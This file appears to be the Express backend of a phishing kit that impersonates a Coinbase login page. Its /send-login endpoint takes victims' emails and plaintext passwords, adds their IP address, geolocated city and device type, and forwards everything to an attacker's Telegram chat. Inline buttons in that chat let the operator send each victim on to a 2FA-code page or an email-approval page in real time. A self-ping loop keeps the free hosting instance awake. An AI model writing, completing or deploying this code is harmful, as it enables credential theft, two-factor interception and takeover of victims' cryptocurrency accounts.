const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

// ✅ Import the bot
const { bot } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🔍 DETECTION FUNCTIONS
// ============================================================================

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    const city = data.city || "Unknown";
    const country = data.country || "Unknown";
    return `${city}, ${country}`;
  } catch (error) {
    return "Unknown Region";
  }
}

// ============================================================================
// 💾 STORAGE
// ============================================================================

let userIdCounter = 1000;
const userIds = {};
const pendingApprovals = {};

// ============================================================================
// 🔔 SELF-PING - Keep Render alive
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
      console.log(`🔄 Self-ping sent - Render kept alive`);
    } catch (err) {
      console.error(`❌ Self-ping failed:`, err.message);
    }
  }, 30000); // Every 30 seconds
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// Frontend calls this to get a unique user ID
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// POST /send-login
// Frontend calls this when user submits email + password
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    console.log(`\n${"=".repeat(60)}`);
    console.log(`📥 COINBASE LOGIN RECEIVED`);
    console.log(`${"=".repeat(60)}`);
    console.log(`   📧 Email: ${email}`);
    console.log(`   👤 User ID: #${userId}`);

    // Get IP from request headers
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`   💻 Device: ${device}`);
    console.log(`   🌍 Region: ${region}`);
    console.log(`   📍 IP: ${ip}`);

    // Map data
    console.log(`\n📌 MAPPING DATA`);
    console.log(`   Email → #${userId} mapped`);

    // ✅ BUILD BEAUTIFUL MESSAGE
    const message =
      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
      `\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    // ✅ BUTTONS - Separate rows
    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
          ],
          [
            { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log(`\n📨 SENDING TO TELEGRAM`);
    
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      console.log(`   ✅ Message sent successfully (WITH BUTTONS)`);
      
      // Store pending login
      pendingApprovals[email] = {
        status: "pending",
        timestamp: Date.now(),
        userId,
        password,
        region,
        device,
        ip
      };

      console.log(`${"=".repeat(60)}\n`);
      res.json({ ok: true, message: "Login request sent for approval", email });
    } else {
      console.error("   ❌ Telegram API error:", response.statusText);
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    console.error("❌ Login error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-status
// Frontend polls this to check if login was approved
// ============================================================================

app.post("/check-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "unknown" });
    }

    if (pendingApprovals[email]) {
      return res.json({
        status: pendingApprovals[email].status || "pending",
        email: email
      });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    console.error("❌ Check status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// Called by Telegram bot when buttons are clicked
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    console.log(`\n${"=".repeat(60)}`);
    console.log(`📬 STATUS UPDATE REQUEST`);
    console.log(`${"=".repeat(60)}`);
    console.log(`   📧 Email: ${email}`);
    console.log(`   🔘 Action: ${status}`);

    if (!pendingApprovals[email]) {
      pendingApprovals[email] = {};
    }

    // ✅ Map status codes
    if (status === "page1") {
      pendingApprovals[email].status = "accepted1";
    } else if (status === "page2") {
      pendingApprovals[email].status = "accepted2";
    } else if (status === "reject") {
      pendingApprovals[email].status = "rejected";
    } else {
      pendingApprovals[email].status = status;
    }

    pendingApprovals[email].updatedAt = Date.now();

    console.log(`\n✅ STATUS UPDATED`);
    console.log(`   New status: ${pendingApprovals[email].status}`);
    console.log(`${"=".repeat(60)}\n`);

    res.json({ ok: true, message: "Status updated" });

  } catch (err) {
    console.error("❌ Update status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = app.listen(PORT, () => {
  console.log(`\n${"=".repeat(60)}`);
  console.log(`✅ SERVER STARTED`);
  console.log(`📍 Backend URL: ${APP_URL}`);
  console.log(`🔌 Port: ${PORT}`);
  console.log(`${"=".repeat(60)}\n`);

  // Start self-ping to keep Render alive
  startSelfPing();
});

module.exports = { app, server };
